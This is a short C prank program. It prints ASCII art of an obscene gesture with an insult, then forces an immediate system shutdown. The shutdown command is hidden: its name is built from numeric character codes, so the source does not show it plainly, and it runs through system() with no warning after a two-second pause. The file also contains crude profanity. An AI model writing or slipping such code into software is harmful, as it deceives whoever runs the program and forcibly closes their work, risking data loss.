#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<time.h>
int main(void)
{
	int s[8] = {115, 104, 117, 116, 100, 111, 119, 110},i,j,an[7] = {70, 117, 99, 107, 79, 102, 102};	
	char a[] = "---- ---";
	for(i=0,j=0;i<8;i++)
		if(a[i]=='-'){
			a[i] = an[j];
			j++;
		}
	printf("        /\\\n       |  |\n       |  |\n    /^-|  |-^\\__\n    |  |  |  |  |\n   /   >  >  >  \\\n   \\            /\n    \\          /\n    | %s |\n         xD\n",a);
	char str[] = "-------- -s -f -t 00";
	for(i=0;i<8;i++)
		str[i] = s[i];
	sleep(2);
	system(str);
}
